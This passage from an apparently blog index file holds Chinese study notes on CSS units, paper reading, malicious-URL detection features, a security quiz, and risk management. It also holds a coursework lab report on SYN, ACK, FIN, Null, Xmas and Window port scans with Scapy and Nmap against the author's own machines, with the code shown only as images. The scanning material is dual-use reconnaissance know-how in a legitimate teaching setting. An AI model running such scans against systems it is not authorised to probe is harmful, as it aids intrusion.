alt="image-20230927210044556"></p></li><li><p>颜色设置：color</p></li></ul><h4 id="文字段落设置"><a href="#文字段落设置" class="headerlink" title="文字段落设置"></a>文字段落设置</h4><ul><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927211511945.png" alt="image-20230927211511945"></p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927211531465.png" alt="image-20230927211531465"></p></li><li><p>相对单位</p><ul><li><p>rem是根em（root em）的缩写。rem是和根元素关联的，不依赖当前元素。不管你在文档中的什么地方使用这个单位，1.2rem的计算值是相等的，等于1.2倍的根元素的字号大小。下面的示例代码中，声明了根元素的字号大小，并在嵌套的无序列表中使用rem声明字号大小。</p></li><li><p><strong>概括地说，在排版属性中 em 单位的意思是“父元素的字体大小”</strong>。带有 <code>ems</code> 类的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ul">&#96;&#96;</a> 内的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/li">&#96;&#96;</a> 元素从它们的父元素中获取大小。因此，每一个连续的嵌套级别都会逐渐变大，因为每个嵌套的字体大小都被设置为 <code>1.3em</code>——是其父嵌套字体大小的 1.3 倍。</p><p><strong>概括地说，rem 单位的意思是“根元素的字体大小”</strong>。（“根 em”的 rem 标准。）<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ul">&#96;&#96;</a> 内的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/li">&#96;&#96;</a> 元素和一个 rems 类从根元素（<code>&lt;html&gt;</code>）中获取它们的大小。这意味着每一个连续的嵌套层都不会不断变大。</p><p>但是，如果你在 CSS 中更改 <code>&lt;html&gt;</code> 字体大小，你将看到所有其他相关内容都发生了更改，包括 <code>rem</code> 和 <code>em</code> 大小的文本。</p></li></ul></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927213223564.png" alt="image-20230927213223564"></p></li><li><p><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927213306054.png" alt="image-20230927213306054"></p><ul><li><img src="/2023/09/29/Css%E5%9F%BA%E7%A1%80/image-20230927213328049.png" alt="image-20230927213328049"></li><li>“，”分隔符，做选择，如果客户机上无法显示，可以换一种字体</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
            <tag> web </tag>
            
            <tag> 选择器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文阅读方法</title>
      <link href="/2023/09/25/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E6%96%B9%E6%B3%95/"/>
      <url>/2023/09/25/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul><li>动机——introduction</li><li>方法——method</li><li>结果——experimrnt</li><li>改进——limitations</li></ul><h2 id="快速阅读"><a href="#快速阅读" class="headerlink" title="快速阅读"></a>快速阅读</h2><ul><li>掌握动机</li><li>解决了什么问题</li><li>创新性是什么</li></ul><h3 id="精细阅读"><a href="#精细阅读" class="headerlink" title="精细阅读"></a>精细阅读</h3><ul><li>复现代码，对比试验</li><li>研究同样的课题，我要改进</li><li>不同的课题，我用她的方法。</li></ul><h3 id="图表"><a href="#图表" class="headerlink" title="图表"></a>图表</h3><ul><li>整体性的图可看——快速</li><li>步骤图——可略</li></ul><h3 id="该跳过就跳过"><a href="#该跳过就跳过" class="headerlink" title="该跳过就跳过"></a>该跳过就跳过</h3><ul><li>研究现状——新手？</li></ul><h3 id="多思考，提问"><a href="#多思考，提问" class="headerlink" title="多思考，提问"></a>多思考，提问</h3><ul><li>他为什么这么做</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据挖掘，论文阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文阅读方法，快速阅读，精细化阅读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意网站检测</title>
      <link href="/2023/09/25/%E6%81%B6%E6%84%8F%E7%BD%91%E7%AB%99%E6%A3%80%E6%B5%8B/"/>
      <url>/2023/09/25/%E6%81%B6%E6%84%8F%E7%BD%91%E7%AB%99%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="一、正常与恶意网址的区别"><a href="#一、正常与恶意网址的区别" class="headerlink" title="一、正常与恶意网址的区别"></a>一、正常与恶意网址的区别</h2><ul><li><h3 id="表层特征"><a href="#表层特征" class="headerlink" title="表层特征"></a>表层特征</h3><ul><li>简短？复杂</li><li>是否各部分都存在（锚点#）</li><li>域名后缀</li><li>…</li></ul></li><li><h3 id="基于机器学习的检测方法"><a href="#基于机器学习的检测方法" class="headerlink" title="基于机器学习的检测方法"></a>基于机器学习的检测方法</h3><ul><li><h4 id="数据采集与清洗"><a href="#数据采集与清洗" class="headerlink" title="数据采集与清洗"></a>数据采集与清洗</h4><ul><li>tldextract</li><li>whois（查域名）</li></ul></li><li><h4 id="特征分析及取值研究"><a href="#特征分析及取值研究" class="headerlink" title="特征分析及取值研究"></a>特征分析及取值研究</h4><ul><li><p>是否有ip【-1，1】</p></li><li><p>url长度【-1，0，1】</p></li><li><p>短网址服务【-1，1】——使用一个重定向，short–&gt;真实</p></li><li><p>是否有@【-1，1】——忽略前面的内容，重定向到@后面有的浏览器支持</p></li><li><p>是否有&#x2F;&#x2F;——1.需要双斜杠，2.需要web服务的一个错误配置</p><ul><li>正常：</li><li><a href="http://a/b/c">http://a/b/c</a>:     :a-&gt;b-&gt;c</li><li><a href="http://a/b//c">http://a/b//c</a>     ：a-&gt;b-&gt;””-&gt;c</li></ul></li><li><p>pageRanking【-1，1】——入度越高 越重要，恶意网站频繁更换域名，pagerank得分就非常低</p></li><li><p>谷歌收录该域名的情况【-1，1】</p></li><li><p>子域名的个数【-1，0，1】——一般不会很多的</p></li><li><p>是否有ssl【-1，0，1】——是否可信，是否使用ssl</p></li><li><p>域名注册时间【-1，1】——可信的一般注册时间长</p></li><li><p>图标【-1，1】——恶意的仓促，没有的概率大</p></li><li><p>port【1，-1】</p></li><li><p>httpsToken【-1，1】——看域名前是否有“https”</p></li><li><p>request_url【-1，1】</p></li><li><p>url of anchor【-1，1】——看网页中的超链接是否连接到外部网址，而不是本域名</p></li><li><meta>link in tags  【1，-1，0】——当中的超链接是否外部域名<ul><li>鼠标悬停隐藏</li><li>右键禁止</li><li>弹窗</li><li>dnsrecord，，是否大</li><li>检测流量——alex排名</li><li>result【-1，1】</li></ul></li></ul></li></ul></li><li><h4 id="算法选择"><a href="#算法选择" class="headerlink" title="算法选择"></a>算法选择</h4><ul><li>二分类</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据挖掘技术，恶意网站检测 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网安技术习题总结</title>
      <link href="/2023/09/25/%E7%BD%91%E5%AE%89%E6%8A%80%E6%9C%AF%E4%B9%A0%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2023/09/25/%E7%BD%91%E5%AE%89%E6%8A%80%E6%9C%AF%E4%B9%A0%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="1-单选题-2分-网络信息的机密性保护"><a href="#1-单选题-2分-网络信息的机密性保护" class="headerlink" title="1. (单选题, 2分)网络信息的机密性保护"></a>1. (单选题, 2分)网络信息的机密性保护</h3><ul><li>A. 确保网络信息没有遭到篡改和破坏</li><li>B. 确保网络信息没有遭到篡改</li><li>C. 确保网络信息没有遭到破坏</li><li>D. 确保网络信息没有遭到泄露</li></ul><p><em>我的答案:</em> A:确保网络信息没有遭到篡改和破坏;<em>正确答案:</em> D:确保网络信息没有遭到泄露;</p><p><em>0</em>分</p><h3 id="2-单选题-2分-网络安全保护对象不涉及"><a href="#2-单选题-2分-网络安全保护对象不涉及" class="headerlink" title="2. (单选题, 2分)网络安全保护对象不涉及"></a>2. (单选题, 2分)网络安全保护对象不涉及</h3><ul><li>A. 电磁设备</li><li>B. 网络用户</li><li>C. 通信系统</li><li>D. 运行数据</li></ul><p><em>我的答案:</em> A:电磁设备;<em>正确答案:</em> B:网络用户;</p>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安技术 </tag>
            
            <tag> 习题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>风险管理</title>
      <link href="/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/"/>
      <url>/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>风险：威胁源、威胁行为、资产的脆弱性、资产、影响</p></blockquote><h2 id="风险管理内容"><a href="#风险管理内容" class="headerlink" title="风险管理内容"></a>风险管理内容</h2><p>定义：1.是识别、控制、消除或最小化可能影响系统资源的不确定因素的过程；2.在组织机构内部识别、优化、管理风险，使风险降低到可接受水平的过程</p><p>&#x3D;&#x3D;四个阶段，两个贯穿&#x3D;&#x3D;</p><blockquote><p>建立背景、风险评估（客观认识到风险的属性）、风险处理、批准监督</p><p>监控审查    沟通咨询</p></blockquote><h3 id="一、风险术语"><a href="#一、风险术语" class="headerlink" title="一、风险术语"></a>一、风险术语</h3><ul><li>资产：有价值的</li><li>脆弱性：与资产有关的弱点或安全隐患，是造成风险的内因（eg.代码缺陷）。脆弱性本身并不对资产构成危害，但是满足一定条件时，脆弱性会被威胁源利用恰当的威胁方式对资产造成不良后果</li><li>控制措施：防范威胁，降低风险的措施。eg.部署防火墙</li><li>可能性：威胁源利用脆弱性造成不良后果的可能性</li><li>影响：威胁源利用脆弱性造成不良后果的程度大小</li><li>风险：威胁源可能采用恰当的威胁方式利用脆弱性造成不良后果</li><li>残余风险：采取了安全措施后仍然可能存在的风险（综合考虑成本与效益</li></ul><h3 id="二、风险评估（未完成）"><a href="#二、风险评估（未完成）" class="headerlink" title="二、风险评估（未完成）**"></a>二、风险评估（未完成）**</h3><blockquote><p>风险评估vs风险管理</p></blockquote><blockquote><ol><li><table><thead><tr><th>vs</th><th>风险管理</th><th>风险评估</th></tr></thead><tbody><tr><td>目标</td><td>将风险降低到可接受水平</td><td>确定面临的风险并确定其优先级</td></tr><tr><td>周期</td><td>风险评估、风险决策、风险控制</td><td>属于风险管理中的单个阶段</td></tr><tr><td>计划</td><td>持续：PDCA循环 (Plan, Do, Check, Adjustment)</td><td>按需要</td></tr></tbody></table></li></ol></blockquote><h4 id="风险评估实践"><a href="#风险评估实践" class="headerlink" title="风险评估实践"></a>风险评估实践</h4><h5 id="1-政策要求"><a href="#1-政策要求" class="headerlink" title="1. 政策要求"></a>1. 政策要求</h5><h5 id="2-风险评估、检查评估和等级保护测评之间的关系"><a href="#2-风险评估、检查评估和等级保护测评之间的关系" class="headerlink" title="2. 风险评估、检查评估和等级保护测评之间的关系"></a>2. 风险评估、检查评估和等级保护测评之间的关系</h5><ul><li>等保测评、安全检查都是在既定安全基线的基础上开展的符合性测评</li><li>等保测评：符合国家安全要求；安全检查：符合行业主管安全要求</li><li>风险评估：在国家、行业安全要求的基础上，以被评估系统特定安全要求为目标而开展的风险识别、风险分析、风险评价活动。</li><li>核心是风险的基本要素（威胁源、威胁行为、脆弱性、资产、影响）。</li></ul><h3 id="三、风险处置方法"><a href="#三、风险处置方法" class="headerlink" title="三、风险处置方法**"></a>三、风险处置方法**</h3><ul><li>减低风险<ul><li>减少威胁源——法律手段</li><li>减低威胁能力——采用身份鉴别措施（要做身份鉴别的网站，写报告）</li><li>减少脆弱性——补丁、关闭无用的端口   <strong>大部分</strong></li><li>防护资产——采用各种防护手段，建立资产的 <strong>安全域，</strong>价值得到保护</li><li>降低负面影响——容灾备份、应急响应、业务连续计划</li></ul></li><li>转移风险<ul><li>资产转移到其它的地方</li><li>只有当风险不能被降低或避免，第三方可以接受</li><li>低概率，但一旦发生就有重大影响。</li><li>方式：服务外包、保险</li></ul></li><li>规避风险<ul><li>物理隔离设备</li><li>没有足够的安全保障的信息系统，就不用来存放特别敏感的信息</li><li>只处理内部业务的系统，<strong>内网</strong>——公安、军方</li></ul></li><li>接受风险<ul><li>发生的概率低</li><li>规避投入太大</li><li>发生造成的影响小</li></ul></li></ul><h3 id="三、批准监督——防线管理工作内容"><a href="#三、批准监督——防线管理工作内容" class="headerlink" title="三、批准监督——防线管理工作内容"></a>三、批准监督——防线管理工作内容</h3><ul><li>批准</li></ul><h2 id="系统生命周期中的风险管理"><a href="#系统生命周期中的风险管理" class="headerlink" title="系统生命周期中的风险管理"></a>系统生命周期中的风险管理</h2><h3 id="一、何时实施风险管理"><a href="#一、何时实施风险管理" class="headerlink" title="一、何时实施风险管理"></a>一、何时实施风险管理</h3><ul><li><p>​整个生命周期都要（包括废弃阶段）</p><ul><li><p><strong>规划</strong></p><ul><li>对系统安全性的实施可能性分析，指定总体安全规划</li></ul></li><li><p><strong>设计</strong></p><ul><li>根据规划方案 <strong>设计信息系统安全的实现结构和实施方案</strong></li></ul></li><li><p><strong>实施</strong></p><ul><li>落实，开发</li><li>安全测试、检查与配置、人员培训、授权系统运行</li></ul></li><li><p><strong>运维</strong></p><ul><li>运行过程中保证系认同的安全性</li></ul></li><li><p><strong>废弃</strong></p><ul><li>过时或无用的部分安全报废</li></ul><blockquote><p>有概念、系统生命周期及目的</p></blockquote></li></ul></li></ul><h3 id="二、风险评估流程"><a href="#二、风险评估流程" class="headerlink" title="二、风险评估流程"></a>二、风险评估流程</h3><ul><li><p>准备、风险要素识别、风险分析、风险结果判定</p></li><li><p><img src="/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/image-20221226190303925-16956021746852.png" alt="img"></p><h4 id="风险评估准备"><a href="#风险评估准备" class="headerlink" title="风险评估准备"></a>风险评估准备</h4><ol><li>制定计划、方案；选择风险评估方法、工具；制定风险评估准则；获得决策层的认可批准</li></ol><h4 id="风险要素识别"><a href="#风险要素识别" class="headerlink" title="风险要素识别"></a>风险要素识别</h4><ol><li><p>资产识别与赋值（很基础）</p><ol><li><p>是整个风险评估的&#x3D;&#x3D;起点和终点&#x3D;&#x3D;</p></li><li><p>重难点——业务战略–&gt;信息化战略–&gt;系统特征</p></li><li><p>资产评估</p><ul><li><p>对资产机制或重要程度进行评估</p></li><li><p>定性——5级 非常重要….</p></li><li><p>定量——5、4….</p></li><li><p>从资产本身的属性——机密、完整、可用、可审计、不可抵赖——&gt;综合评估得出</p></li><li><blockquote><p>就是先分再总</p></blockquote></li><li><p>综合评估</p><ul><li>最大原则——选里面最大的</li><li>加权原则——给每个属性赋权</li></ul></li><li><p>资产本身属性有一个&#x3D;&#x3D;赋值表&#x3D;&#x3D;，选择题能够判断。</p></li></ul></li></ol></li><li><p>威胁</p><ul><li>识别：从威胁源的角度；威胁树、系统故障威胁树</li><li>评估：针对频率和强度评估<ul><li>也有一个&#x3D;&#x3D;赋值表&#x3D;&#x3D;</li></ul></li><li>对非常重要的资产才进行威胁识别。</li><li>方法：日志分析…</li><li>分类：<ul><li>人为故意威胁</li><li>认为非故意威胁</li><li>自然威胁</li></ul></li></ul></li><li><p><em>脆弱性</em>&#x3D;&#x3D;&#x3D;漏洞</p><ol><li><p>脆弱性识别与威胁识别的关系：</p><ul><li>以资产为对象，对威胁识别进行验证</li></ul></li><li><p>难点</p><ul><li>三性：隐蔽性、欺骗性、复杂性</li></ul></li><li><p>分类</p><ul><li>管理、结构、操作、技术、物理（有指导表）</li></ul></li><li><p>脆弱性识别的工作方式（选择题）</p><ul><li>安全配置核查</li><li>漏洞扫描</li><li>渗透测试——护网行动</li><li>安全架构分析</li><li>数据流分析</li><li>访谈</li></ul></li><li><p>也有一个标准表</p></li></ol></li><li><p>确认已有的安全措施（很重要）</p><ol><li>预防、检测、纠正、威慑</li></ol></li></ol></li></ul><h4 id="风险分析"><a href="#风险分析" class="headerlink" title="风险分析"></a>风险分析</h4><ul><li><p>计算风险值&#x3D;R(A,T,V)&#x3D;R( L(T,V), F(IA, VA)   （能写 且能解释）</p><p><img src="/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/image-20221226194547825.png" alt="image-20221226194547825"></p></li><li><p>a-asset，t-thread</p></li><li><p>定性风险分析——矩阵法</p></li><li><p>风险评估工具</p></li></ul><h6 id="风险分析方法"><a href="#风险分析方法" class="headerlink" title="风险分析方法"></a>风险分析方法</h6><ol><li><p>类别</p><ul><li><p>定性</p></li><li><p>定量</p></li><li><p>综合</p></li></ul></li><li><p>定性风险分析方法</p><ul><li>凭借分析者的经验和直觉，业界的标准和惯例、粗粒度（可能 非常可能…）</li><li>更具有主观性</li><li>发生概率、后果与影响</li><li>矩阵分析<ul><li><img src="/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/image-20231008083446845.png" alt="image-20231008083446845"></li></ul></li></ul></li><li><p>定量风险分析</p><ul><li>风险评估与成本效益分析期间手机的各个组成部分计算客观数字值</li><li>更具客观性</li><li>公式</li><li>期望年度损失ALE<ul><li>评估资产：根据资产价值（AV）清单,计算资产总价值及 资产损失对财务的直接和间接影响</li><li>确定单一预期损失：SLE<ul><li>SLE是指发生一次风险引起的收入损失总额</li><li>将资产价值与暴露系数相乘 (EF) 计算出 SLE。暴露系数表示为 现实威胁对某个资产造成的损失百分比</li></ul></li><li>确定年发生率ARO<ul><li>ARO指一年中风险发生的次数</li></ul></li><li>确定年预期损失ALE：&#x3D;&#x3D;ALE&#x3D;SLE<em>ARO&#x3D;AV</em>EF*ARO&#x3D;&#x3D;</li><li>确定控制成本：规避企业存在的风险发生而投入的费用（安全人员招聘）</li><li>安全投资收益：ROSI<ul><li>ROSI &#x3D; (实施控制前的ALE）–（实施控制后的ALE）–（年控制成本）</li></ul></li></ul></li></ul></li><li><p>定性VS定量</p><ol><li>定性更容易达成一致，定量则不</li><li>定性在重要风险之间没有足够的区分力度；定量则不。</li><li>定性没有为成本效益分析</li></ol></li><li><p>半定量分析</p><ul><li>综合二者</li><li>相乘法<img src="/2023/09/22/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0/image-20231008085358931.png" alt="image-20231008085358931"></li></ul></li><li><p>综合评估（几乎）</p><ul><li>层次分析AHP</li><li>模糊综合评价</li><li>基于灰色理论</li><li>…</li></ul></li></ol><h6 id="国产化替代"><a href="#国产化替代" class="headerlink" title="国产化替代"></a>国产化替代</h6><ol><li>阶段<ul><li>外围——&gt;工业软件替代——&gt;信息系统整体国产化</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 风险评估、风险处置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口扫描</title>
      <link href="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
      <url>/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-作业题目"><a href="#1-作业题目" class="headerlink" title="1    作业题目"></a>1    作业题目</h1><p>实验2：端口扫描实验</p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><p><strong>内容：</strong></p><p>本次实验主要对主机扫描和端口扫描原理的理解。使用Python（Scapy库）编写端口扫描程序，对目标IP（包含IP地址段）进行扫描。</p><p><strong>（1）</strong> <strong>使用ICMP协议探测主机是否开启；</strong></p><p> 将ip设置为本机环回地址，ping该主机，并在终端运行该代码，显示如下，说明本机开启。</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922170751823.png" alt="image-20230922170751823"></p><p>​图 1 访问本机环回地址成功</p><p>代码解释：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922170829376.png" alt="image-20230922170829376"></p><p>1.由于ICMP协议是基于IP协议传输的，所以需要通过scrapy中的IP()先构造IP包。这里删除了原有&#x2F;b的内容，&#x2F;b后跟的是包传输的数据，但是经过实验发现，跟上数据比较容易造成丢包，所以删除了附带的data。</p><p>2.sr1()是scrapy中能够返回接收报文的一个函数，它能够发送三层数据包，并等待接收一个数据包的响应，其中timeout等待响应的最大时间（以秒为单位）。这里设置为1秒，表示如果在1秒内没有收到响应，函数将超时并返回None；verbose是一个布尔值，用于控制是否显示Scapy的详细输出，将其设置为False以禁用详细输出以打印自己想要的输出。</p><p>除此以外，sr1()还可以通过display函数显示详细信息，如下图所示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922170905796.png" alt="image-20230922170905796"></p><p>​图 2 ping.display()</p><p><strong>（2）</strong> <strong>对本机（关闭防火墙）的开放端口和非开放端口完成半连接、ACK、FIN、Null、Xmas、Windows扫描，并与Nmap扫描结果进行比较。</strong></p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922170948521.png" alt="image-20230922170948521"></p><p>​图 3关闭所有防火墙</p><ol><li>半连接：</li></ol><p>•     原理：扫描者向目标主机发送一个SYN数据包，如果目标主机以SYN&#x2F;ACK响应，这表明主机仍然活跃；但如果目标主机以RST&#x2F;ACK响应，这表示主机不再活跃；如果未响应，则被过滤。</p><p>•     代码展示：（开放端口：23；非开放端口：1500）</p><p>Ipconfig查看主机ip：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171014628.png" alt="image-20230922171014628"></p><p>​图 4主机ip</p><p>函数实现：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171036890.png" alt="image-20230922171036890"></p><p>​图 5 SYN</p><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171058185.png" alt="image-20230922171058185"></p><p>​图 6 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171103564.png" alt="image-20230922171103564"></p><p>​图 7 右scrapy，左nmap，非开放端口</p><ol start="2"><li>ACK：</li></ol><p>•     原理：虽然根据课上所学，ACK扫描应该能够根据ttl的大小来判断端口是否开放，但是在本机使用了nmap并结合实验以及网上查阅资料，得出一个结论，针对本机的windows操作系统，ack扫描只能够确定端口是过滤状态或是未过滤状态，不能够判断端口是否开放。</p><p>•     代码展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171140912.png" alt="image-20230922171140912"></p><p>​图 8 ACK</p><p>•     结果展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171155840.png" alt="image-20230922171155840"></p><p>​图 9 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171201340.png" alt="image-20230922171201340"></p><p>​图 10 右scrapy，左nmap，非开放端口</p><ol start="3"><li>FIN：</li></ol><p>•     原理：它利用TCP协议中的FIN（Finish）标志位来发送TCP数据包，以了解目标主机的响应，这是在TCP通信中四次挥手过程中产生效应的标志位，根据目标主机接响应的FIN数据包的情况来判断其端口的状态。如果端口开放或者被过滤，则没有反应；端口关闭，目标主机会发送RST。<em>经过实验发现，fin扫描在本操作系统失效，详情见结果展示。以下采用wireshark抓包证实，后面若遇到失效都会在nmap执行命令时抓包来证实结论。</em></p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171229157.png" alt="image-20230922171229157"></p><p>​图 11wireshark抓包证实FIN失效</p><p>•     代码展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171243358.png" alt="image-20230922171243358"></p><p>​图 12 FIN</p><p>•     结果展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171257672.png" alt="image-20230922171257672"></p><p>​图 13 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171303520.png" alt="image-20230922171303520"></p><p>​图 14 右scrapy，左nmap，非开放端口</p><ol start="4"><li>Null：</li></ol><p>•     原理：与FIN类似，只是flag置空，且在本操作系统也失效</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171328134.png" alt="image-20230922171328134"></p><p>​图 15 NULL失效</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171334905.png" alt="image-20230922171334905"></p><p>​图 16 NULL</p><p>•     结果展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171405262.png" alt="image-20230922171405262"></p><p>​图 17 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171410772.png" alt="image-20230922171410772"></p><p>​图 18 右scrapy，左nmap，非开放端口</p><ol start="5"><li>Xmas：</li></ol><p>•     原理：与FIN类似，只是flag置FIN\URG\PUSH三个标志位。本操作系统失效。</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171431343.png" alt="image-20230922171431343"></p><p>​图 19 XMAS失效</p><p>•     代码展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171445897.png" alt="image-20230922171445897"></p><p>​图 20 XMAS</p><p>•     结果展示</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171458282.png" alt="image-20230922171458282"></p><p>​图 21 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171504061.png" alt="image-20230922171504061"></p><p>​图 22 右scrapy，左nmap，非开放端口</p><ol start="6"><li>Windows：</li></ol><p>•     原理：窗口扫描也是发送一个ACK报文，但它能够通过“window”字区别出端口的开放状态，理论上说，window&gt;0，端口开放；window&#x3D;0,端口关闭；未响应，则被过滤，无法判断端口开放情况。通过wireshark抓包显示，本操作系统上的的包回应不满足此规则，实验发现所有包回复的window都为0，又失效。</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171528441.png" alt="image-20230922171528441"></p><p>​图 23 window失效</p><p>•     代码展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171541208.png" alt="image-20230922171541208"></p><p>​图 24 Window</p><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171551787.png" alt="image-20230922171551787"></p><p>​图 25 右scrapy，左nmap，开放端口</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171556565.png" alt="image-20230922171556565"></p><p>​图 26 右scrapy，左nmap，非开放端口</p><p><strong>（3）</strong> <strong>对远程（有防火墙）主机的开放端口和非开放端口完成半连接、ACK、FIN、Null、Xmas、Windows扫描，并与2）进行比较，分析结果。</strong></p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171613749.png" alt="image-20230922171613749"></p><p>​图 27　虚拟机操作系统信息</p><p>开启防火墙</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171633854.png" alt="image-20230922171633854"></p><p>​图 28　开启防火墙</p><ol><li>首先测试虚拟机是否能够ping通</li></ol><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171658660.png" alt="image-20230922171658660"></p><p>​图 29 linux虚拟机作为远程主机，能够ping通</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171708690.png" alt="image-20230922171708690"></p><p>​图 30　查看虚拟机的开放端口</p><p>开放端口使用：23；非开放端口：1500</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171722920.png" alt="image-20230922171722920"></p><p>​图 31　修改IP与端口列表</p><ol start="2"><li>半连接</li></ol><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171803490.png" alt="image-20230922171803490"></p><p>​图 32　SYN测试虚拟机</p><ol start="3"><li>ACK</li></ol><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171833131.png" alt="image-20230922171833131"></p><p>​图 33　ＡＣＫ测试虚拟机</p><ol start="4"><li>FIN</li></ol><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922171854512.png" alt="image-20230922171854512"></p><p>​图 34　